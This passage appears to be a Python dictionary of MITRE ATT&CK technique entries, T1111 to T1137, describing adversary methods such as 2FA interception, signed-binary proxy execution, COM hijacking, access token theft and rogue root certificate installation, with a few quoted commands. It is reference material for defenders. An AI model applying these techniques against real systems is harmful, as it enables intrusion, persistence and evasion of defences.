                          '* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n'
                          '* LDAP (389/TCP)\n'
                          '* Kerberos (88/TCP)\n'
                          '* RDP / Terminal Services (3389/TCP)\n'
                          '* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n'
                          '* MSSQL (1433/TCP)\n'
                          '* Oracle (1521/TCP)\n'
                          '* MySQL (3306/TCP)\n'
                          '* VNC (5900/TCP)\n'
                          '\n'
                          'In addition to management services, adversaries may "target single sign-on (SSO) and '
                          'cloud-based applications utilizing federated authentication protocols," as well as '
                          'externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A '
                          '2018)\n'
                          '\n'
                          '\n'
                          'In default environments, LDAP and Kerberos connection attempts are less likely to trigger '
                          'events over SMB, which creates Windows "logon failure" event ID 4625.',
           'name': 'Brute Force',
           'platforms': ['Linux', 'macOS', 'Windows', 'Office 365', 'Azure AD', 'SaaS']},
 'T1111': {'attack_id': 'T1111',
           'categories': ['credential-access'],
           'description': 'Use of two- or multifactor authentication is recommended and provides a higher level of '
                          'security than user names and passwords alone, but organizations should be aware of '
                          'techniques that could be used to intercept and bypass these security mechanisms. '
                          'Adversaries may target authentication mechanisms, such as smart cards, to gain access to '
                          'systems, services, and network resources.\n'
                          '\n'
                          'If a smart card is used for two-factor authentication (2FA), then a keylogger will need to '
                          'be used to obtain the password associated with a smart card during normal use. With both an '
                          'inserted card and access to the smart card password, an adversary can connect to a network '
                          'resource using the infected system to proxy the authentication with the inserted hardware '
                          'token. (Citation: Mandiant M Trends 2011)\n'
                          '\n'
                          'Adversaries may also employ a keylogger to similarly target other hardware tokens, such as '
                          "RSA SecurID. Capturing token input (including a user's personal identification code) may "
                          'provide temporary access (i.e. replay the one-time passcode until the next value rollover) '
                          'as well as possibly enabling adversaries to reliably predict future authentication values '
                          '(given access to both the algorithm and any seed values used to generate appended temporary '
                          'codes). (Citation: GCN RSA June 2011)\n'
                          '\n'
                          'Other methods of 2FA may be intercepted and used by an adversary to authenticate. It is '
                          'common for one-time codes to be sent via out-of-band communications (email, SMS). If the '
                          'device and/or service is not secured, then it may be vulnerable to interception. Although '
                          'primarily focused on by cyber criminals, these authentication mechanisms have been targeted '
                          'by advanced actors. (Citation: Operation Emmental)',
           'name': 'Two-Factor Authentication Interception',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1112': {'attack_id': 'T1112',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may interact with the Windows Registry to hide configuration information within '
                          'Registry keys, remove information as part of cleaning up, or as part of other techniques to '
                          'aid in Persistence and Execution.\n'
                          '\n'
                          'Access to specific areas of the Registry depends on account permissions, some requiring '
                          'administrator-level access. The built-in Windows command-line utility '
                          '[Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry '
                          'modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote '
                          'access tool, which may contain functionality to interact with the Registry through the '
                          'Windows API (see examples).\n'
                          '\n'
                          'Registry modifications may also include actions to hide keys, such as prepending key names '
                          'with a null character, which will cause an error and/or be ignored when read via '
                          '[Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. '
                          '(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to '
                          'conceal payloads/commands used to establish Persistence. (Citation: TrendMicro POWELIKS AUG '
                          '2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n'
                          '\n'
                          'The Registry of a remote system may be modified to aid in execution of files as part of '
                          'Lateral Movement. It requires the remote Registry service to be running on the target '
                          'system. (Citation: Microsoft Remote) Often [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the '
                          "remote system's [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) for RPC "
                          'communication.',
           'name': 'Modify Registry',
           'platforms': ['Windows']},
 'T1113': {'attack_id': 'T1113',
           'categories': ['collection'],
           'description': 'Adversaries may attempt to take screen captures of the desktop to gather information over '
                          'the course of an operation. Screen capturing functionality may be included as a feature of '
                          'a remote access tool used in post-compromise operations.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'On OSX, the native command <code>screencapture</code> is used to capture screenshots.\n'
                          '\n'
                          '### Linux\n'
                          '\n'
                          'On Linux, there is the native command <code>xwd</code>. (Citation: Antiquated Mac Malware)',
           'name': 'Screen Capture',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1114': {'attack_id': 'T1114',
           'categories': ['collection'],
           'description': 'Adversaries may target user email to collect sensitive information from a target.\n'
                          '\n'
                          "Files containing email data can be acquired from a user's system, such as Outlook storage "
                          'or cache files .pst and .ost.\n'
                          '\n'
                          "Adversaries may leverage a user's credentials and interact directly with the Exchange "
                          'server to acquire information from within a network. Adversaries may also access externally '
                          'facing Exchange services or Office 365 to access email using credentials or access tokens. '
                          'Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate '
                          'searches for specific key words.(Citation: Black Hills MailSniper, 2017)\n'
                          '\n'
                          '### Email Forwarding Rule\n'
                          '\n'
                          'Adversaries may also abuse email-forwarding rules to monitor the activities of a victim, '
                          'steal information, and further gain intelligence on the victim or the victim’s organization '
                          'to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Outlook '
                          'and Outlook Web App (OWA) allow users to create inbox rules for various email functions, '
                          'including forwarding to a different recipient. Messages can be forwarded to internal or '
                          'external recipients, and there are no restrictions limiting the extent of this rule. '
                          'Administrators may also create forwarding rules for user accounts with the same '
                          'considerations and outcomes.(Citation: TIMMCMIC, 2014)\n'
                          '\n'
                          'Any user or administrator within the organization (or adversary with valid credentials) can '
                          'create rules to automatically forward all received messages to another recipient, forward '
                          'emails to different locations based on the sender, and more. ',
           'name': 'Email Collection',
           'platforms': ['Windows', 'Office 365']},
 'T1115': {'attack_id': 'T1115',
           'categories': ['collection'],
           'description': 'Adversaries may collect data stored in the Windows clipboard from users copying information '
                          'within or between applications. \n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Applications can access clipboard data by using the Windows API. (Citation: MSDN '
                          'Clipboard) \n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents  (Citation: '
                          'Operating with EmPyre).',
           'name': 'Clipboard Data',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1116': {'attack_id': 'T1116',
           'categories': ['defense-evasion'],
           'description': 'Code signing provides a level of authenticity on a binary from the developer and a '
                          'guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) '
                          'However, adversaries are known to use code signing certificates to masquerade malware and '
                          'tools as legitimate binaries (Citation: Janicab). The certificates used during an operation '
                          'may be created, forged, or stolen by the adversary. (Citation: Securelist Digital '
                          'Certificates) (Citation: Symantec Digital Certificates)\n'
                          '\n'
                          'Code signing to verify software on first run can be used on modern Windows and macOS/OS X '
                          'systems. It is not used on Linux due to the decentralized nature of the platform. '
                          '(Citation: Wikipedia Code Signing)\n'
                          '\n'
                          'Code signing certificates may be used to bypass security policies that require signed code '
                          'to execute on a system.',
           'name': 'Code Signing',
           'platforms': ['macOS', 'Windows']},
 'T1117': {'attack_id': 'T1117',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Regsvr32.exe is a command-line program used to register and unregister object linking and '
                          'embedding controls, including dynamic link libraries (DLLs), on Windows systems. '
                          'Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)\n'
                          '\n'
                          'Adversaries may take advantage of this functionality to proxy execution of code to avoid '
                          'triggering security tools that may not monitor execution of, and modules loaded by, the '
                          'regsvr32.exe process because of whitelists or false positives from Windows using '
                          'regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.\n'
                          '\n'
                          'Regsvr32.exe can also be used to specifically bypass process whitelisting using '
                          'functionality to load COM scriptlets to execute DLLs under user permissions. Since '
                          'regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform '
                          'resource locator (URL) to file on an external Web server as an argument during invocation. '
                          'This method makes no changes to the Registry as the COM object is not actually registered, '
                          'only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often '
                          'referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments. '
                          '(Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting '
                          'Mongolian Gov)\n'
                          '\n'
                          'Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence '
                          'via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). '
                          '(Citation: Carbon Black Squiblydoo Apr 2016)',
           'name': 'Regsvr32',
           'platforms': ['Windows']},
 'T1118': {'attack_id': 'T1118',
           'categories': ['defense-evasion', 'execution'],
           'description': 'InstallUtil is a command-line utility that allows for installation and uninstallation of '
                          'resources by executing specific installer components specified in .NET binaries. (Citation: '
                          'MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: '
                          '<code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and '
                          '<code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>. '
                          'InstallUtil.exe is digitally signed by Microsoft.\n'
                          '\n'
                          'Adversaries may use InstallUtil to proxy execution of code through a trusted Windows '
                          'utility. InstallUtil may also be used to bypass process whitelisting through use of '
                          'attributes within the binary that execute the class decorated with the attribute '
                          '<code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)',
           'name': 'InstallUtil',
           'platforms': ['Windows']},
 'T1119': {'attack_id': 'T1119',
           'categories': ['collection'],
           'description': 'Once established within a system or network, an adversary may use automated techniques for '
                          'collecting internal data. Methods for performing this technique could include use of '
                          '[Scripting](https://attack.mitre.org/techniques/T1064) to search for and copy information '
                          'fitting set criteria such as file type, location, or name at specific time intervals. This '
                          'functionality could also be built into remote access tools. \n'
                          '\n'
                          'This technique may incorporate use of other techniques such as [File and Directory '
                          'Discovery](https://attack.mitre.org/techniques/T1083) and [Remote File '
                          'Copy](https://attack.mitre.org/techniques/T1105) to identify and move files.',
           'name': 'Automated Collection',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1120': {'attack_id': 'T1120',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to gather information about attached peripheral devices and '
                          'components connected to a computer system. The information may be used to enhance their '
                          'awareness of the system and network environment or may be used for further actions.',
           'name': 'Peripheral Device Discovery',
           'platforms': ['Windows', 'macOS']},
 'T1121': {'attack_id': 'T1121',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Regsvcs and Regasm are Windows command-line utilities that are used to register .NET '
                          'Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: '
                          'MSDN Regsvcs) (Citation: MSDN Regasm)\n'
                          '\n'
                          'Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows '
                          'utility. Both utilities may be used to bypass process whitelisting through use of '
                          'attributes within the binary to specify code that should be run before registration or '
                          'unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> '
                          'respectively. The code with the registration and unregistration attributes will be executed '
                          'even if the process is run under insufficient privileges and fails to execute. (Citation: '
                          'LOLBAS Regsvcs)(Citation: LOLBAS Regasm)',
           'name': 'Regsvcs/Regasm',
           'platforms': ['Windows']},
 'T1122': {'attack_id': 'T1122',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'The Component Object Model (COM) is a system within Windows to enable interaction between '
                          'software components through the operating system. (Citation: Microsoft Component Object '
                          'Model) Adversaries can use this system to insert malicious code that can be executed in '
                          'place of legitimate software through hijacking the COM references and relationships as a '
                          'means for persistence. Hijacking a COM object requires a change in the Windows Registry to '
                          'replace a reference to a legitimate system component which may cause that component to not '
                          'work when executed. When that system component is executed through normal system operation '
                          "the adversary's code will be executed instead. (Citation: GDATA COM Hijacking) An adversary "
                          'is likely to hijack objects that are used frequently enough to maintain a consistent level '
                          'of persistence, but are unlikely to break noticeable functionality within the system as to '
                          'avoid system instability that could lead to detection.',
           'name': 'Component Object Model Hijacking',
           'platforms': ['Windows']},
 'T1123': {'attack_id': 'T1123',
           'categories': ['collection'],
           'description': "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) "
                          'or applications (e.g., voice and video call services) to capture audio recordings for the '
                          'purpose of listening into sensitive conversations to gather information.\n'
                          '\n'
                          'Malware or scripts may be used to interact with the devices through an available API '
                          'provided by the operating system or an application to capture audio. Audio files may be '
                          'written to disk and exfiltrated later.',
           'name': 'Audio Capture',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1124': {'attack_id': 'T1124',
           'categories': ['discovery'],
           'description': 'The system time is set and stored by the Windows Time Service within a domain to maintain '
                          'time synchronization between systems and services in an enterprise network. (Citation: MSDN '
                          'System Time) (Citation: Technet Windows Time Service)\n'
                          '\n'
                          'An adversary may gather the system time and/or time zone from a local or remote system. '
                          'This information may be gathered in a number of ways, such as with '
                          '[Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time '
                          "\\\\hostname</code> to gather the system time on a remote system. The victim's time zone "
                          'may also be inferred from the current system time or gathered by using <code>w32tm '
                          '/tz</code>. (Citation: Technet Windows Time Service) The information could be useful for '
                          'performing other techniques, such as executing a file with a [Scheduled '
                          "Task](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to "
                          'discover locality information based on time zone to assist in victim targeting.',
           'name': 'System Time Discovery',
           'platforms': ['Windows']},
 'T1125': {'attack_id': 'T1125',
           'categories': ['collection'],
           'description': "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or "
                          'webcams) or applications (e.g., video call services) to capture video recordings for the '
                          'purpose of gathering information. Images may also be captured from devices or applications, '
                          'potentially in specified intervals, in lieu of video files.\n'
                          '\n'
                          'Malware or scripts may be used to interact with the devices through an available API '
                          'provided by the operating system or an application to capture video or images. Video or '
                          'image files may be written to disk and exfiltrated later. This technique differs from '
                          '[Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices '
                          "or applications for video recording rather than capturing the victim's screen.\n"
                          '\n'
                          "In macOS, there are a few different malware samples that record the user's webcam such as "
                          'FruitFly and Proton. (Citation: objective-see 2017 review)',
           'name': 'Video Capture',
           'platforms': ['Windows', 'macOS']},
 'T1126': {'attack_id': 'T1126',
           'categories': ['defense-evasion'],
           'description': 'Windows shared drive and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) '
                          'connections can be removed when no longer needed. '
                          '[Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to '
                          'remove network share connections with the <code>net use \\\\system\\share /delete</code> '
                          'command. (Citation: Technet Net Use)\n'
                          '\n'
                          'Adversaries may remove share connections that are no longer useful in order to clean up '
                          'traces of their operation.',
           'name': 'Network Share Connection Removal',
           'platforms': ['Windows']},
 'T1127': {'attack_id': 'T1127',
           'categories': ['defense-evasion', 'execution'],
           'description': 'There are many utilities used for software development related tasks that can be used to '
                          'execute code in various forms to assist in development, debugging, and reverse engineering. '
                          'These utilities may often be signed with legitimate certificates that allow them to execute '
                          'on a system and proxy execution of malicious code through a trusted process that '
                          'effectively bypasses application whitelisting defensive solutions.\n'
                          '\n'
                          '### MSBuild\n'
                          '\n'
                          'MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It '
                          'takes XML formatted project files that define requirements for building various platforms '
                          'and configurations. (Citation: MSDN MSBuild) \n'
                          '\n'
                          'Adversaries can use MSBuild to proxy execution of code through a trusted Windows utility. '
                          'The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# '
                          'code to be inserted into the XML project file. (Citation: MSDN MSBuild) Inline Tasks '
                          'MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, '
                          'so when it is used this way it can execute arbitrary code and bypass application '
                          'whitelisting defenses that are configured to allow MSBuild.exe execution. (Citation: LOLBAS '
                          'Msbuild)\n'
                          '\n'
                          '### DNX\n'
                          '\n'
                          'The .NET Execution Environment (DNX), dnx.exe, is a software development kit packaged with '
                          'Visual Studio Enterprise. It was retired in favor of .NET Core CLI in 2016. (Citation: '
                          'Microsoft Migrating from DNX) DNX is not present on standard builds of Windows and may only '
                          'be present on developer workstations using older versions of .NET Core and ASP.NET Core '
                          '1.0. The dnx.exe executable is signed by Microsoft. \n'
                          '\n'
                          'An adversary can use dnx.exe to proxy execution of arbitrary code to bypass application '
                          'whitelist policies that do not account for DNX. (Citation: engima0x3 DNX Bypass)\n'
                          '\n'
                          '### RCSI\n'
                          '\n'
                          'The rcsi.exe utility is a non-interactive command-line interface for C# that is similar to '
                          'csi.exe. It was provided within an early version of the Roslyn .NET Compiler Platform but '
                          'has since been deprecated for an integrated solution. (Citation: Microsoft Roslyn CPT RCSI) '
                          'The rcsi.exe binary is signed by Microsoft. (Citation: engima0x3 RCSI Bypass)\n'
                          '\n'
                          'C# .csx script files can be written and executed with rcsi.exe at the command-line. An '
                          'adversary can use rcsi.exe to proxy execution of arbitrary code to bypass application '
                          'whitelisting policies that do not account for execution of rcsi.exe. (Citation: engima0x3 '
                          'RCSI Bypass)\n'
                          '\n'
                          '### WinDbg/CDB\n'
                          '\n'
                          'WinDbg is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft Console '
                          'Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows '
                          'software development kits and can be used as standalone tools. (Citation: Microsoft '
                          'Debugging Tools for Windows) They are commonly used in software development and reverse '
                          'engineering and may not be found on typical Windows systems. Both WinDbg.exe and cdb.exe '
                          'binaries are signed by Microsoft.\n'
                          '\n'
                          'An adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass '
                          'application whitelist policies that do not account for execution of those utilities. '
                          '(Citation: Exploit Monday WinDbg)\n'
                          '\n'
                          'It is likely possible to use other debuggers for similar purposes, such as the kernel-mode '
                          'debugger kd.exe, which is also signed by Microsoft.\n'
                          '\n'
                          '### Tracker\n'
                          '\n'
                          'The file tracker utility, tracker.exe, is included with the .NET framework as part of '
                          'MSBuild. It is used for logging calls to the Windows file system. (Citation: Microsoft Docs '
                          'File Tracking)\n'
                          '\n'
                          'An adversary can use tracker.exe to proxy execution of an arbitrary DLL into another '
                          'process. Since tracker.exe is also signed it can be used to bypass application whitelisting '
                          'solutions. (Citation: LOLBAS Tracker)',
           'name': 'Trusted Developer Utilities',
           'platforms': ['Windows']},
 'T1128': {'attack_id': 'T1128',
           'categories': ['persistence'],
           'description': 'Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to '
                          'interact with the network configuration of a system. It contains functionality to add '
                          'helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths '
                          'to registered netsh.exe helper DLLs are entered into the Windows Registry at '
                          '<code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n'
                          '\n'
                          'Adversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a '
                          'persistent manner when netsh.exe is executed automatically with another Persistence '
                          'technique or if other persistent software is present on the system that executes netsh.exe '
                          'as part of its normal functionality. Examples include some VPN software that invoke '
                          'netsh.exe. (Citation: Demaske Netsh Persistence)\n'
                          '\n'
                          "Proof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs. "
                          '(Citation: Github Netsh Helper CS Beacon)',
           'name': 'Netsh Helper DLL',
           'platforms': ['Windows']},
 'T1129': {'attack_id': 'T1129',
           'categories': ['execution'],
           'description': 'The Windows module loader can be instructed to load DLLs from arbitrary local paths and '
                          'arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in '
                          'NTDLL.dll and is part of the Windows Native API which is called from functions like '
                          'CreateProcess(), LoadLibrary(), etc. of the Win32 API. (Citation: Wikipedia Windows Library '
                          'Files)\n'
                          '\n'
                          'The module loader can load DLLs:\n'
                          '\n'
                          '* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT '
                          'directory;\n'
                          '    \n'
                          '* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) '
                          'pathname (but without extension);\n'
                          '    \n'
                          '* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative '
                          'pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded '
                          'EXPORTs;\n'
                          '    \n'
                          '* via <code>&#x3c;file name="filename.extension" loadFrom="fully-qualified or relative '
                          'pathname"&#x3e;</code> in an embedded or external "application manifest". The file name '
                          'refers to an entry in the IMPORT directory or a forwarded EXPORT.\n'
                          '\n'
                          'Adversaries can use this functionality as a way to execute arbitrary code on a system.',
           'name': 'Execution through Module Load',
           'platforms': ['Windows']},
 'T1130': {'attack_id': 'T1130',
           'categories': ['defense-evasion'],
           'description': 'Root certificates are used in public key cryptography to identify a root certificate '
                          'authority (CA). When a root certificate is installed, the system or application will trust '
                          "certificates in the root's chain of trust that have been signed by the root certificate. "
                          '(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing '
                          'secure TLS/SSL communications within a web browser. When a user attempts to browse a '
                          'website that presents a certificate that is not trusted an error message will be displayed '
                          'to warn the user of the security risk. Depending on the security settings, the browser may '
                          'not allow the user to establish a connection to the website.\n'
                          '\n'
                          'Installation of a root certificate on a compromised system would give an adversary a way to '
                          'degrade the security of that system. Adversaries have used this technique to avoid security '
                          'warnings prompting users when compromised systems connect over HTTPS to adversary '
                          'controlled web servers that spoof legitimate websites in order to collect login '
                          'credentials. (Citation: Operation Emmental)\n'
                          '\n'
                          'Atypical root certificates have also been pre-installed on systems by the manufacturer or '
                          'in the software supply chain and were used in conjunction with malware/adware to provide a '
                          'man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL '
                          'communications. (Citation: Kaspersky Superfish)\n'
                          '\n'
                          'Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned '
                          'certificate chains will carry many of the same metadata characteristics of the source and '
                          'can be used to sign malicious code that may then bypass signature validation tools (ex: '
                          'Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of '
                          'Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n'
                          '\n'
                          'In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot '
                          '-k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious '
                          'certificate as a trusted root certificate into the system keychain. (Citation: '
                          'objective-see ay mami 2018)',
           'name': 'Install Root Certificate',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1131': {'attack_id': 'T1131',
           'categories': ['persistence'],
           'description': 'Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) '
                          'process at system start. They provide support for multiple logon processes and multiple '
                          'security protocols to the operating system. (Citation: MSDN Authentication Packages)\n'
                          '\n'
                          'Adversaries can use the autostart mechanism provided by LSA Authentication Packages for '
                          'persistence by placing a reference to a binary in the Windows Registry location '
                          '<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of '
                          '<code>"Authentication Packages"=<target binary></code>. The binary will then be executed by '
                          'the system when the authentication packages are loaded.',
           'name': 'Authentication Package',
           'platforms': ['Windows']},
 'T1132': {'attack_id': 'T1132',
           'categories': ['command-and-control'],
           'description': 'Command and control (C2) information is encoded using a standard data encoding system. Use '
                          'of data encoding may be to adhere to existing protocol specifications and includes use of '
                          'ASCII, Unicode, Base64,  MIME, UTF-8, or other binary-to-text and character encoding '
                          'systems. (Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character '
                          'Encoding) Some data encoding systems may also result in data compression, such as gzip.',
           'name': 'Data Encoding',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1133': {'attack_id': 'T1133',
           'categories': ['persistence', 'initial-access'],
           'description': 'Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to '
                          'internal enterprise network resources from external locations. There are often remote '
                          'service gateways that manage connections and credential authentication for these services. '
                          'Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1028) can '
                          'also be used externally.\n'
                          '\n'
                          'Adversaries may use remote services to initially access and/or persist within a network. '
                          '(Citation: Volexity Virtual Private Keylogging) Access to [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a '
                          'requirement, which could be obtained through credential pharming or by obtaining the '
                          'credentials from users after compromising the enterprise network. Access to remote services '
                          'may be used as part of [Redundant Access](https://attack.mitre.org/techniques/T1108) during '
                          'an operation.',
           'name': 'External Remote Services',
           'platforms': ['Windows']},
 'T1134': {'attack_id': 'T1134',
           'categories': ['defense-evasion', 'privilege-escalation'],
           'description': 'Windows uses access tokens to determine the ownership of a running process. A user can '
                          'manipulate access tokens to make a running process appear as though it belongs to someone '
                          'other than the user that started the process. When this occurs, the process also takes on '
                          'the security context associated with the new token. For example, Microsoft promotes the use '
                          'of access tokens as a security best practice. Administrators should log in as a standard '
                          'user but run their tools with administrator privileges using the built-in access token '
                          'manipulation command <code>runas</code>.(Citation: Microsoft runas)\n'
                          '  \n'
                          'Adversaries may use access tokens to operate under a different user or system security '
                          'context to perform actions and evade detection. An adversary can use built-in Windows API '
                          'functions to copy access tokens from existing processes; this is known as token stealing. '
                          'An adversary must already be in a privileged user context (i.e. administrator) to steal a '
                          'token. However, adversaries commonly use token stealing to elevate their security context '
                          'from the administrator level to the SYSTEM level. An adversary can use a token to '
                          'authenticate to a remote system as the account for that token if the account has '
                          'appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n'
                          '\n'
                          'Access tokens can be leveraged by adversaries through three methods:(Citation: BlackHat '
                          'Atkinson Winchester Token Manipulation)\n'
                          '\n'
                          '**Token Impersonation/Theft** - An adversary creates a new access token that duplicates an '
                          'existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with '
                          '<code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on '
                          "user's security context, or with <code>SetThreadToken</code> to assign the impersonated "
                          'token to a thread. This is useful for when the target user has a non-network logon session '
                          'on the system.\n'
                          '\n'
                          '**Create Process with a Token** - An adversary creates a new access token with '
                          '<code>DuplicateToken(Ex)</code> and uses it with <code>CreateProcessWithTokenW</code> to '
                          'create a new process running under the security context of the impersonated user. This is '
                          'useful for creating a new process under the security context of a different user.\n'
                          '\n'
                          '**Make and Impersonate Token** - An adversary has a username and password but the user is '
                          'not logged onto the system. The adversary can then create a logon session for the user '
                          'using the <code>LogonUser</code> function. The function will return a copy of the new '
                          "session's access token and the adversary can use <code>SetThreadToken</code> to assign the "
                          'token to a thread.\n'
                          '\n'
                          'Any standard user can use the <code>runas</code> command, and the Windows API functions, to '
                          'create impersonation tokens; it does not require access to an administrator account.\n'
                          '\n'
                          'Metasploit’s Meterpreter payload allows arbitrary token manipulation and uses token '
                          'impersonation to escalate privileges.(Citation: Metasploit access token) The Cobalt Strike '
                          'beacon payload allows arbitrary token impersonation and can also create tokens. (Citation: '
                          'Cobalt Strike Access Token)',
           'name': 'Access Token Manipulation',
           'platforms': ['Windows']},
 'T1135': {'attack_id': 'T1135',
           'categories': ['discovery'],
           'description': 'Networks often contain shared network drives and folders that enable users to access file '
                          'directories on various systems across a network. \n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia '
                          'Shared Resource) (Citation: TechNet Shared Folder)\n'
                          '\n'
                          '[Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for '
                          'available shared drives using the <code>net view \\\\remotesystem</code> command. It can '
                          'also be used to query shared drives on the local system using <code>net share</code>.\n'
                          '\n'
                          'Adversaries may look for folders and drives shared on remote systems as a means of '
                          'identifying sources of information to gather as a precursor for Collection and to identify '
                          'potential systems of interest for Lateral Movement.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'On Mac, locally mounted shares can be viewed with the <code>df -aH</code> command.\n'
                          '\n'
                          '### Cloud\n'
                          '\n'
                          'Cloud virtual networks may contain remote network shares or file storage services '
                          'accessible to an adversary after they have obtained access to a system. For example, AWS, '
                          'GCP, and Azure support creation of Network File System (NFS) shares and Server Message '
                          'Block (SMB) shares that may be mapped on endpoint or cloud-based systems.(Citation: Amazon '
                          'Creating an NFS File Share)(Citation: Google File servers on Compute Engine)',
           'name': 'Network Share Discovery',
           'platforms': ['macOS', 'Windows', 'AWS', 'GCP', 'Azure']},
 'T1136': {'attack_id': 'T1136',
           'categories': ['persistence'],
           'description': 'Adversaries with a sufficient level of access may create a local system, domain, or cloud '
                          'tenant account. Such accounts may be used for persistence that do not require persistent '
                          'remote access tools to be deployed on the system.\n'
                          '\n'
                          'In cloud environments, adversaries may create accounts that only have access to specific '
                          'services, which can reduce the chance of detection.\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'The <code>net user</code> commands can be used to create a local or domain account.\n'
                          '\n'
                          '### Office 365\n'
                          '\n'
                          'An adversary with access to a Global Admin account can create another account and assign it '
                          'the Global Admin role for persistent access to the Office 365 tenant.(Citation: Microsoft '
                          'O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)',
           'name': 'Create Account',
           'platforms': ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure AD', 'Azure', 'Office 365']},
 'T1137': {'attack_id': 'T1137',
           'categories': ['persistence'],
           'description': 'Microsoft Office is a fairly common application suite on Windows-based operating systems '
                          'within an enterprise network. There are multiple mechanisms that can be used with Office '
                          'for persistence when an Office-based application is started.\n'
                          '\n'
                          '### Office Template Macros\n'
                          '\n'
                          'Microsoft Office contains templates that are part of common Office applications and are '
                          'used to customize styles. The base templates within the application are used each time an '
                          'application starts. (Citation: Microsoft Change Normal Template)\n'
                          '\n'
                          'Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be '
                          'inserted into the base template and used to execute code when the respective Office '
                          'application starts in order to obtain persistence. Examples for both Word and Excel have '
                          'been discovered and published. By default, Word has a Normal.dotm template created that can '
                          'be modified to include a malicious macro. Excel does not have a template file created by '
                          'default, but one can be added that will automatically be loaded.(Citation: enigma0x3 '
